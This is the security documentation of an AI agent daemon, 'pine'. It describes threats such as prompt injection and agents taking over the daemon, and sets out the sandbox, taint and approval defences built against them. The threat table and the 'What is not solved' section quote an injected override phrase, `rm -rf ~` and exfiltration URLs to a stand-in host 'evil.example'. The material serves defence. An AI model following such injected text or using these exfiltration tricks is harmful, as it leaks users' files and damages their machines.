# Security

pine runs models that read things strangers wrote and that can run commands. This page says
what is defended, how, and what is left.

## What can go wrong

| Threat | Example |
|---|---|
| Someone outside drives the daemon | A stranger messages your bot; a web page you have open posts to the control port; someone on the network calls a webhook |
| Prompt injection | A mail, web page, MQTT message or file name contains "ignore your instructions and ..." and the model follows it |
| An agent, misled or mistaken, damages the machine | `rm -rf ~`, overwriting another project, reading SSH keys |
| Information leaves | The agent is talked into sending your files to a URL, a chat or a device |
| The agent takes over the daemon | It writes an extension or changes its own configuration so that hostile code runs with the daemon's rights on the next start |

No model reliably tells instructions from data. pine therefore does not depend on the model
refusing; it limits what a run can do, by where its input came from.

## The layers

### 1. Who may speak

- **Telegram:** only the account you paired, or the user ids in `allow`, are heard. What anyone
  else writes reaches no agent. Pairing needs both ends: the bot sends a code to the account
  that wrote to it, and that code has to be typed into pine, which names the account. So a
  stranger cannot pair (they do not see your screen), you cannot pair a stranger by a slip of
  the finger (you do not have their code), and an account you deny is not asked about again.
  Once your account is paired, anybody else who writes to the bot gets no answer at all and
  causes no question.
- **Control API:** loopback by default; every request except `GET /health` and the webhooks
  (which carry their own secret) needs a bearer token (generated into `data/http-token`, mode
  600, which the CLI reads). Control requests carrying an `Origin` or `Sec-Fetch-Site` header
  or an unexpected `Host` are refused, so a web page in your browser cannot use it, with or
  without DNS rebinding. Bodies must be JSON and at most 1 MB (64 MB for a message with attached
  files).
- **Webhooks:** each hook has a secret (bearer or HMAC of the body) unless you set `"open":
  true`, a rate limit (120 requests a minute), and a fixed topic.
- **MQTT, watched folders:** you choose the topics and folders. What arrives is treated as
  outside content.
- **Event sources:** you configure them, or confirm what an agent sets up. One that nobody is
  subscribed to is not running (unless you gave it `"start": "always"`). What they report is outside content unless you mark the source
  as yours; see "Event sources" below.

### 2. Where content came from decides what it may do

Every event carries `trust`. It is `owner` when the content came through a channel that
authenticated you (a paired or allow-listed Telegram account, the control API), from a
schedule (one you wrote, or one an agent made at your wish), from a source you marked
`"trust": "owner"`, or from an agent's `publish_event` in a conversation that has read no
outside content. Everything else is `untrusted`.

A task started by an untrusted event runs with the agent's `untrusted` profile:

- built-in tools `read`, `grep`, `find`, `ls` only; no shell, no writing;
- no MCP servers, no delegation, no `publish_event`, no state writes, no sub-agents;
- in its own session (`<name>~u`), so it neither sees your conversation nor leaves text in it.

These tools are not hidden from such a run; they are not registered in it. Each item can be
widened per agent (`"untrusted": { "stateWrite": true }`) or the agent can refuse untrusted
tasks altogether (`"untrusted": false`). Tasks an untrusted run hands on stay untrusted for
whoever receives them.

A route may declare its events trusted (`"trust": "owner"`). Do that only for a source nobody
else can write to; `pine check` lists every such route.

One case is handled differently: an event of a source that one of your conversations is
subscribed to is delivered into that conversation, framed as data, and taints it (layer 4)
instead of starting a reduced run. "Event sources" below says why, and how `"separate": true`
gets the reduced run back.

### 3. The sandbox

Every shell command and every file tool call of an agent runs inside a sandbox of the
operating system: Apple's `sandbox-exec` on macOS, [bubblewrap](https://github.com/containers/bubblewrap)
(`bwrap`) on Linux. The rules are the same on both:

| | |
|---|---|
| Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, and the system outside your home folder (programs, libraries) |
| Can write | Its workspace, its private home (`sandbox/<id>/`, which is `$HOME` in its shell), temp. The main agent also `USER.md` in pine's home, and nothing else there |
| Cannot read or write | Your home folder, pine's home (configuration, `.env`, database, other agents' folders), other agents' workspaces |
| Cannot | Use the network (unless `sandbox.network` or you granted it to the conversation; the `download` tool is the exception described under Modes), signal or inspect other processes, or reach the services of your session: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, the container daemon, an ssh agent |
| Environment | A handful of variables (`PATH`, `LANG`, ...). Nothing from the daemon's environment, no secrets |

How the two systems say it differs. On macOS the sandbox gets a profile that starts from
"deny everything" and allows what the table lists. On Linux the command is given a file
system of its own: everything read-only, your home folder and pine's home as empty folders
with the agent's own folders put back, a process list and a `/dev` of its own, no network
device, and a system call filter that refuses sockets to other programs on the machine
(behind those are the session bus, the keyring, a container daemon, a terminal multiplexer).
"On Linux" below lists where that leaves a difference.

The file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their I/O through the same
sandbox rather than in the daemon. That closes the usual gap of "check the path, then open it":
replacing a file with a symlink after the check gains nothing, because the operating system
applies the policy at the moment of access.

A conversation that you opened a folder for (`pine <folder>`, `/folder`, the folder in the UI's
bottom bar) can also read and write that folder, and its tools start there. That is the whole
of it: the folder is that conversation's and the sub-agents it starts, not the agent's other
conversations', not that of an agent it delegates to, and not that of a run that outside
content started. Only you can open one; agents have no tool for it. pine's home, pine's own
program and other agents' workspaces are refused, also as part of a larger folder. The
folder's `AGENTS.md` and `CLAUDE.md` become instructions to the agent, so open folders whose
authors you would let instruct it. See [coding.md](coding.md).

#### On Linux

bubblewrap has to be installed (`apt install bubblewrap`, `dnf install bubblewrap`,
`pacman -S bubblewrap`) and has to be allowed to create user namespaces. pine tries it once at
start. Where it does not work, `pine check` gives the reason and pine behaves as on a machine
without a sandbox (below). The usual reasons:

- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. Give bubblewrap a
  profile that allows them: a file `/etc/apparmor.d/bwrap` with

  ```
  abi <abi/4.0>,
  include <tunables/global>

  profile bwrap /usr/bin/bwrap flags=(unconfined) {
    userns,
  }
  ```

  loaded with `sudo apparmor_parser -r /etc/apparmor.d/bwrap`. (Setting
  `kernel.apparmor_restrict_unprivileged_userns=0` does it for every program instead.)
- **A container** (Docker, Podman) forbids a sandbox inside it. With pine as root in the
  container it needs `--cap-add SYS_ADMIN --cap-add NET_ADMIN --security-opt
  seccomp=unconfined --security-opt apparmor=unconfined --security-opt
  systempaths=unconfined` (or `--privileged`). Without them pine in a container has no agent
  sandbox; the container is then the only wall, and it is around all agents and pine's secrets
  together.
- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=`.

What differs from macOS:

| | macOS | Linux |
|---|---|---|
| Your home folder, pine's home | Access is refused | They are empty, read-only folders: a command sees that they exist, and in them only the way to the folders it was given |
| Instruction files, and a repository's hooks and configuration, in a run that read outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only. What did not exist can be created by a shell command, and pine removes it when the command ends. Both are looked for six folders deep, and not inside folders of installed packages or build output (`node_modules`, `.venv`, `dist`, `build`, `target` and the like) |
| Programs on the same machine (the session bus, the keyring, a container daemon, a terminal multiplexer, an editor's helper) | Without the network, no connection of any kind. Keychain, clipboard, AppleScript and launching apps are refused by name, also with the network | Without the network a command cannot make a socket to another program (a system call filter, on x86-64 and arm64; programs built for 32 bit do not run then). The session's folder (`/run/user`) is empty and the sockets in `/run` are covered, also with the network |
| With the network granted | Addresses only: the internet and your local network. Socket files stay closed, except in the agent's own folders (not the shared temp folder), where its own programs talk to each other | Also programs that listen on a socket file where the agent can read outside `/run` (a tmux server or an ssh agent in the temp folder), and those that listen on a socket without a file (an X server does) |
| Processes a command leaves in the background | Not ended by the sandbox | End with the command |
| pine run as root | Commands run as root | Commands run as root without root's special powers (capabilities), which they could otherwise use to undo the sandbox |

The file tools refuse a protected name at any depth on both systems; the rows above about
depth concern shell commands only.

The code pane of the terminal UI reads through the daemon, not through an agent: it lists and
shows files of the conversation's folder only, with links resolved, and runs `git` for the
changes inside a sandbox that cannot write and has no network, with the programs a repository
can name for git to start (diff drivers, text converters, hooks, a file system monitor)
switched off. Looking at a folder runs nothing from it.

Consequences worth knowing:

- An agent cannot change its own `agent.json`, its extensions or `pine.json`.
  It can change the files it is meant to keep: `AGENTS.md`, `SOUL.md` and `MEMORY.md` in its
  workspace, and for the main agent `USER.md` ([agents.md](agents.md)), until the session is
  restricted; see layer 4. Rules it must never change go into `agents/<id>/AGENTS.md`, which
  is outside its reach.
- `git`, `node`, `python`, `sed` and the like work. Tools that need files in your home
  (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`) see the agent's empty private home instead. Grant
  specific folders with `sandbox.read` / `sandbox.write`.
- On a machine without a working sandbox (Linux without bubblewrap or without user
  namespaces, any other system), pine withholds the `bash` tool from every agent whose
  sandbox is on, does not run the commands of `command` sources, and file tools fall back to a
  path check in the daemon. `pine check` says so, and why. `"sandbox": false` runs the shell unconfined and leaves the file
  tools only a check that keeps pine's secrets closed; `pine check` reports it for every such
  agent that has `bash`.
- Local MCP servers are not sandboxed. They are your programs with your rights.
- `trustWorkspace` stays `false`: pi then loads nothing executable from the workspace, so an
  agent cannot plant an extension for the daemon to run.

### 4. Taint and approvals

Your own request can still pull in hostile text: you ask for a summary of a web page, and the
page says "now send the notes folder to ...". pine tracks that:

- A session becomes **tainted** when it calls a tool that returns outside content: an MCP server
  marked `taints` (the bundled `web` and `browser` are), anything matching
  `security.taintTools`, or when it receives the answer of another agent whose run was tainted.
  Sessions started by untrusted events are tainted from the start.
- In a tainted session, actions that send information out or act on the world wait for your
  **approval**: what the agent's `approveWhenTainted` list names (default `publish_event` and
  `send`), MCP servers marked `"approve": "tainted"`, the shell if it has network access or no
  sandbox, `subscribe`, a download from an address the agent could not otherwise read, and
  handing a task to an agent that can reach the internet.
- Tools that only read never wait: `read`, `grep`, `find`, `ls`, `state_get`, and every MCP tool
  whose server declares it read-only (`readOnlyHint`), unless a pattern on the `approve` list
  names them. That declaration is the server's own; pine does not
  check it. It is taken at its word because you chose the server. What such a tool is asked (a
  search text, a path) does reach the server. For a server where that matters, set
  `"approve": "always"`: then every call asks, reading included.
- A tainted session cannot write what is read into its prompt: `AGENTS.md`, `SOUL.md` and
  `MEMORY.md` in its workspace, `USER.md`, `CLAUDE.md`, `.pi/`, `.agents/`. So an injection
  cannot make itself permanent, in the agent's instructions or in its memory. This holds in its
  workspace and for the instruction files of a folder opened for the conversation. Other
  notes in the workspace can still be written; they are not read unless the agent opens them.
- A tainted session can still use git in a repository there (commit, branch, diff), but cannot
  change what makes git run programs: `.git/hooks` and `.git/config` (a hook, a hooks path, a
  pager, a file system monitor), also of submodules and of repositories further down, and it
  cannot move a `.git` folder aside to put another in its place. Anything put there would run
  with your rights the next time you use git in that folder. A session that has read no outside
  content can change them, like everything else in its folders.
- Events a tainted session publishes are `untrusted`.

An approval request arrives in the terminal UI as a dialog and in Telegram with buttons, showing
the agent, the tool and its arguments, and why you are asked. `pine approvals`,
`pine approve <id>` and `pine deny <id>` do the same from a terminal. No answer within
`security.approvalTimeout` means no. The agent is told the action was not approved and to report
instead of retrying.

There are three answers: allow once, deny, and **always in this conversation** ("Always here" in
the UI, the "Always: ..." button in Telegram, `pine approve <id> --always`). "Always" covers the
whole MCP server the tool belongs to, or the one tool if it is not from a server (`bash`, for
example), until the conversation is reset or the daemon restarts. Three things to know:

- It is not offered for what you configured to ask every time (the `approve` list, a server with
  `"approve": "always"`).
- Network access that you grant to a conversation which has already read outside content counts
  as "always" for its shell and its downloads: you said yes knowing what it had read.
- A yes given while the conversation was clean does not carry over once it has read outside
  content. You are asked again, and that answer then holds.

Taint lasts for the life of the session (`security.taint: "session"`), because the text is still
in the context. `/reset` in the terminal UI, or `pine reset`, clears it along with the
conversation.
`"run"` forgets it after each task, which is more convenient and weaker. `"off"` means no tool
call marks a conversation at all: what a subscribed source reports then arrives with full tools
and no questions. Runs that an outside event started stay restricted in every setting.

`approve` in `agent.json` lists actions that need approval every time in `manual` and `auto`
mode, tainted or not (bypass skips them like everything else):

```json
{ "approve": ["bash:*git push*", "send:house", "mcp__calendar__delete_*"] }
```

### Modes: how much an agent does without asking

Each agent has a mode. It decides what happens at the two boundaries above: the sandbox and the
approval prompts.

| Mode | Approvals | Sandbox |
|---|---|---|
| `manual` | Every action that changes or sends something waits for you, unless you answered "always" for it in this conversation. Reading files and state and read-only MCP tools are free. | As configured |
| `auto` (default) | Only what the rules single out: the `approve` list, and sending things out or acting on the world from a tainted session. A conversation that has read nothing from outside is never interrupted by the second rule | As configured. For anything beyond it the agent calls `request_access`, and you decide |
| `bypass` | Nothing waits | Shell and file tools reach your whole account and the network |

`request_access` is how an agent in `auto` or `manual` mode gets at something outside its
workspace: it names a path (read, or read and write) or asks for network access from its shell,
with a reason. You see the request like any approval. If you allow it, the access holds for that
conversation until you reset it or the daemon restarts. Refusals tell the agent to ask this way
instead of probing.

**Sub-agents share their conversation's permissions.** A sub-agent is a copy of the agent doing
part of the conversation's job, so it works under what you allowed there: the access you
granted, and your "always" answers. It works the other way too: what a sub-agent asks for and
gets holds for the conversation and its other sub-agents, so you are asked once, not once per
copy. Nothing is widened by this: a sub-agent inherits the conversation's outside-content mark
as well, and another conversation of the same agent, or a run started by an outside event, has
none of it. An agent that a task is *delegated* to is a different agent with its own sandbox and
its own permissions.

**Downloads.** The shell has no network in `auto` and `manual` mode, but getting a file from a
server you connected is routine, so there is a `download` tool for it. It fetches an address into
the workspace, byte for byte, and reports size and SHA-256.

- An address on the origin of one of the agent's remote MCP servers (same scheme, host and port
  as the server's `url`) is fetched without a question. A redirect that leads elsewhere is not
  followed under this rule.
- An agent with the bundled `web` or `browser` server can already read any public address
  without asking, so it may also save what is there: any public https address is fetched without
  a question, also in a session that has read outside content. The `allowHosts` and `denyHosts`
  of the `web` server apply while the conversation has no network access of its own; its
  `allowPrivate` applies too, and then addresses on your network and plain http are fetched.
  The session is marked as having read outside content.
- Without web access, any other address needs network access for the conversation
  (`sandbox.network`, a grant from `request_access`, or bypass). Without it the download is
  refused and you are not asked. With it, only https and only public addresses are fetched, and
  in a session that has read outside content the download asks first.
- The daemon does the fetching; the file is put in place through the agent's sandbox, so the
  operating system decides where it may land, as with the write tool. `limits.maxDownloadMb`
  (default 200) caps the size. Runs with the reduced tool set (layer 2) do not have the tool.

**Pictures in the terminal UI.** Showing pictures adds four read paths to the control API (see
[operations.md](operations.md)); all need the API token like everything else there.

- The path of a workspace picture comes from model output, so that endpoint serves only regular
  image and video files (checked by content, not by name) that really lie inside the agent's
  workspace or the folder opened for that conversation.
  It cannot be used to read other files, also not through a link.
- A picture at a web address is fetched only when you click it, never because an answer
  contains it. Otherwise `![](https://somewhere/?q=<your notes>)` in an answer would send data
  out the moment it is displayed.
- Picture files are decoded by macOS's `sips` (on Linux by `ffmpeg`) and videos by `ffmpeg`, both started without
  network access and without write access outside the temp folder, because the bytes can come
  from anywhere. "Open in player" hands the file to the system's player, which has no such
  limits; it only happens on your click.
- Pictures a tool returned are kept in `data/media/tool` (mode 600) for as long as the event
  log reaches back (`limits.eventRetentionDays`).

**Event sources.** A source ([sources.md](sources.md)) brings in content from outside by
design, and a subscription lets that content start an agent turn without you. What keeps this
safe:

- Events of a source are outside content unless you mark the source `"trust": "owner"`. By
  default an event is delivered into the conversation the agent subscribed in, framed as data,
  and that conversation is then tainted (layer 4): sending things out and acting on the world
  ask you first, bypass is paused. The agent does keep its tools there, as it does after
  reading a web page; with `"separate": true` on the subscription the event instead starts a
  run with the reduced tool set in a session of its own (layer 2), which is the stronger
  protection for sources that carry strangers' text.
- An agent can set up a source itself (`add_source`), but only in a conversation with you, and
  you confirm everything that opens something new: a folder outside its workspace (which it may
  then also read), a connection, a port, a source for all agents, a source to be trusted as
  yours. Only a folder in its own workspace goes through without a question, and
  not in a conversation that has read outside content or in manual mode. A secret that pine
  makes (a webhook's secret, an FTP drop's password) is not shown to the model: the agent is
  told the name of its `.env` entry. A password you tell the agent passes through the tool call
  once. Either way the value is stored in `.env`, never in `pine.json` or an `agent.json`, and
  is kept out of events and logs.
- Subscribing is something only you, or an agent in a conversation with you, can do. A run
  with the reduced tool set (started by an untrusted event through a route, or by a
  subscription with `"separate": true`) has no `subscribe` tool. In a conversation that has
  read outside content, which includes one that an event of a subscribed source arrived in,
  the tool asks you first: otherwise a web page or a file name could make an agent start
  listening to something.
- A source that nobody subscribed to is not running: no open port, no connection (unless you
  marked it `"start": "always"`).
- The `ftp` type only receives, needs a password, writes under names of its own choosing into
  its own folder, and can be limited to client addresses. The `webhook` type needs a secret
  unless it is set up with `"open": true`, which the dialog spells out.
- A subscription has a throttle (10 s unless you change it), so a device that reports every
  second cannot keep a model busy.

What no mode opens:

- pine's home: configuration, `.env`, credentials, the database, other agents' folders.
  Agents never write there. What they may set up goes through tools that check what they are
  given and write only that ([setup.md](setup.md)): a remote MCP server (`add_mcp_server`, which
  asks you in every mode with the name and URL), event sources and subscriptions, and, for the
  main agent alone, a new agent (`create_agent`, which always asks you and shows its
  instructions). Only the main agent can set anything up for all agents. Runs with the reduced
  tool set (layer 2) have none of these tools, and a proposal from a conversation that has read
  outside content says so in the dialog, because a web page asking for "this handy server" is
  the obvious trick.
- pine's own program files, for writing.
- Runs started by untrusted events. They keep the `untrusted` profile and cannot ask for more.
  They run as `auto` whatever the agent's mode: neither `manual` nor `bypass` applies to them.

And by default `bypass` is suspended in a session that has read outside content: from then on
that session behaves like `auto` until you reset it. A web page is exactly the moment someone
else may be steering the agent, and bypass plus a hostile page is your whole account. The pause
is never silent: the terminal UI prints a note, shows "bypass (paused)", and the agent itself
is told and will say so when you ask why something is still refused.

Two ways to have bypass regardless:

- For one conversation, as a decision made with the facts in front of you: choose bypass in a
  conversation that is already tainted and the UI asks whether you want a clean conversation
  (recommended) or bypass in this one anyway. "Anyway" holds for that conversation until it is
  reset or the mode changes.
- Always: `"security": { "bypassWhenTainted": true }`. `pine check` says what that means for
  each agent whose configured mode is `bypass`.

With either, the guards on instruction files and git settings (layer 4) no longer hold in that
conversation: they are part of the sandbox that bypass lifts.

Set the mode where it should last, or switch it while running:

```json
{ "mode": "manual" }
```

in `agent.json` (or `defaults.mode` in `pine.json` for all agents); `/mode` or `shift+tab` in the
terminal UI; `pine mode <agent> <mode>` from a shell. A switch made while running lasts until the
daemon restarts.

### 5. Sources that go and look

- **A web address (`http`)** is fetched by pine itself, so the address is yours to confirm: the
  dialog names it and says when it is on your own network, a redirect is followed only on the
  same host, and a token is sent nowhere else. An address that was confirmed as a public one is
  not followed into your network if its name later leads there. What the address answers is
  outside content like any page an agent reads.
- **A command (`command`)** runs in the sandbox of the agent the source belongs to (the main
  agent's, for a source of all agents), like a command in that agent's own shell: no more
  files, no more network, not your environment, and instruction files read-only. It cannot read
  pine's secrets or write its configuration. You see the command line before it is set up, in
  every mode. What it prints is outside content unless you say the source is yours. If that
  agent has `"sandbox": false`, the command runs unconfined, as its shell does; on a machine
  without a working sandbox it is not run at all.
- **Status lines** (when a source last looked, what it found) are read by agents without the
  mark that outside content gets. A source therefore repeats a found value there only when it
  is a number or a single word.

### 6. A new kind of source is a program

A source type runs inside pine with pine's rights; no sandbox applies to it. It gets in by your
hand (`sourceTypes` in `pine.json`, or `"use"` on a single source's entry) or through the main
agent's `add_source_type`, and then only

- from the main agent, in a conversation with you,
- never from a conversation that has read outside content: there the tool refuses without
  asking you,
- with your yes in a dialog that says it is a program, how long it is, what it imports and
  where the file is, in every mode and every time,
- as a copy pine takes at that moment into its own home, which agents cannot write. What you
  confirmed is what runs.

Read the file before you confirm. Nothing else stands between that module and your account.
`pine check` lists every registered source type, and every source that names a module with
`"use"`, with the file it runs.

### 7. Schedules act in your name

What a schedule starts counts as your wish: the agent is woken with its usual tools, and
nothing is marked as outside content. So a schedule must really be your wish:

- An agent schedules for the conversation it is in, or for itself from its main conversation,
  without a question (except in manual mode). For itself from a side conversation, or for all
  agents (the main agent only), you are asked.
- In a conversation that has read outside content you are asked in every case, in every mode,
  and you see the task: a sentence on a web page must not turn into something done every hour.
- An interval an agent sets is at least a minute.
- A schedule is an entry in pine's configuration, which agents cannot write. `pine schedules`
  shows all of them with their tasks; an agent's `schedules` tool shows its own and those for
  all agents.

### 8. Skills are instructions

A skill is read into an agent's prompt (its name and description) and followed when a task
calls for it, so it is guarded like the instruction files:

- Skills lie in pine's home, where an agent can read its own and write none. `add_skill`
  writes them; an agent's shell and file tools cannot.
- `add_skill` refuses in a conversation that has read outside content, in every mode, without
  asking you: text from a web page must not become a standing instruction.
- A skill for all agents is the main agent's to add, and you see its description and
  instructions before it exists. So does one an agent adds for itself from a side conversation.
  In manual mode you see every skill before it exists.
- Scripts that go along with a skill run like anything else the agent runs: in its sandbox.
- Files are copied as files. A link in the folder that is to go along is refused, so a skill
  cannot be made to carry a file from outside the workspace.

### 9. Outputs check for themselves

Whatever asks, the Telegram source sends only to your own chat, and the MQTT source publishes
only to topics on its `publish` list. In a conversation that has read outside content, the
`send` tool asks you first. An agent's `publish` list names the topics it
may use at all. Agents cannot publish on pine's own topics (`agent/`, `approval/`, `pine/`,
`state/`, `timer/`).

### 10. Secrets

- Secrets live in `.env`. pine fills them into the configuration and does not put them into
  its environment, so child processes do not inherit them.
- Known secret values (every value in `.env` of eight characters or more, bot tokens, the control token) are replaced with
  `[redacted]` in events, outgoing messages and log lines.
- A secret does not have to pass through a model to be set up. Agents are told never to ask for
  one; a tool that needs one leaves it out, and you type it into pine's own dialog, from where
  it goes to the daemon and into `.env`. One that is in `.env` already is used by its name. A
  model that runs somewhere else never receives it either way.
- If you write a secret into a conversation anyway and an agent stores it, it is redacted from
  then on and removed from the stored events and tasks. That conversation's history and the
  model have still seen it: change such a secret if the model is not yours.
- `pine check` reports configuration files, and a home folder, that other users can read.

### 11. Limits against runaway behaviour

Delegation depth and loops, event hops, queue length per agent, task and shell time limits,
prompt size for untrusted events: all in [configuration.md](configuration.md). The webhook
rate is fixed at 120 requests a minute per hook.

## A layout that keeps the pieces apart

The example home starts with one agent, `main`, that has web search and the browser. That is
fine while its workspace holds nothing you would mind losing to a web page: it has a sandbox, no
access to your files, and what it can do to the world is what a signed-out browser can do. It stops being fine when you add private
material.

The dangerous combination is one agent that has private data, reads outside content and can
send things out. Once you have agents with private data, split those:

| Agent | Has | Does not have |
|---|---|---|
| `main` | Your conversation, delegation to everyone | Web tools, network |
| `scout` | Web search and page reading | Anything private: an empty workspace, no delegation, no state |
| Specialists (`gonzo`, `house`) | Their repository, their own MCP servers | Web tools, network |
| `house` | Events from cameras and sensors (untrusted profile), writes `house/` state | A shell, the network |

`main` asks `scout` to research. What comes back is text, and it taints `main`'s session: from
then on `main` needs your approval to publish events or to hand `scout` another task. Scout
itself can be fooled by a page, but it has nothing to give away and cannot act.

## What is not solved

- **Leaks through an approved or unguarded channel.** If you give one agent both private files
  and web access, a page can ask it to fetch `https://evil.example/?q=<your data>`, and that
  fetch is the tool working as intended. The layout above avoids it; the URL length limit only
  makes it slower.
- **Bad answers.** An injected page can still make an agent tell you something false. Approval
  prompts show you the action, not whether the reasoning behind it was honest.
- **Approval fatigue.** If you approve without reading, layer 4 is worth nothing. Requests show
  the full arguments for that reason.
- **Bypass mode.** It is what it says: an agent in bypass acts with your rights, on your files,
  with the network, unasked. Use it for a task you are watching, on an agent that is not reading
  the web, and switch back.
- **Your own MCP servers, extensions and source types.** They run unsandboxed, also a source
  type the main agent wrote and you confirmed: the dialog shows what it is, not what it does. A server that can delete mail can
  delete mail when an agent asks; mark such servers `"approve": "tainted"` or `"always"`.
- **Shell with network.** `sandbox.network: true` lets commands reach the internet and your
  local network, including an unauthenticated model server and anything else that listens on
  a port of this machine. On Linux also programs that listen on a socket file in the temp
  folders (a tmux server, an editor's helper, an ssh agent): some of those run commands for
  whoever connects. macOS keeps socket files closed ("On Linux" under layer 3). Prefer the `web` server or a
  `commands` tool for the one thing that needs the network.
- **A signed-in browser.** With a persistent `profile`, the bundled browser acts as you on every
  site you signed in to. A hostile page can ask the agent to click things there. Keep signed-in
  profiles for tasks you start and watch yourself.
- **The sandbox is the operating system's.** On macOS, `sandbox-exec` is deprecated but is
  what Apple's own tools and other agent runtimes use. On Linux, bubblewrap is what Flatpak
  uses; pine adds no system call filter to it. On both, a kernel or sandbox bug would be a
  way out. For stronger isolation run the daemon under a separate user with no access to your
  files.
- **Linux: new instruction files exist until the command ends**, and are looked for six
  folders deep. See "On Linux" under layer 3.
- **Local users.** Another account on the machine that can read pine's home has everything.
  Keep the home at mode 700.
- **Model quality.** A small quantised model follows hostile text more readily than a large one.
  The layers above are built for that, but a weaker model will trip the approval prompts more
  often.

## Checklist

1. `pine check` shows "No security notes", or you know why each note is there.
2. Every webhook has a secret (`pine check` names hooks and `webhook` sources that have none), and `pine check` names no source whose reports count as yours unless it should (a paired Telegram account is not listed).
3. `.env`, `pine.json`, `models.json` and `auth.json` are mode 600; the home is 700. `pine check` reports all of these.
4. No agent has `"sandbox": false`, `"trustWorkspace": true` or `"mode": "bypass"` in its configuration.
5. Web and browser tools are on an agent whose workspace holds nothing private.
6. MCP servers that return other people's text have `"taints": true`; those that change things
   have `"approve": "tainted"`.
7. No route sets `"trust": "owner"` for a source others can write to.
8. `http.host` is `127.0.0.1`. Remote access goes through SSH or a tunnel.
9. You receive approval requests (send yourself one: give an agent `"approve": ["bash:*"]` once
   and ask it to run `ls`; not while the agent is in bypass, where nothing asks).
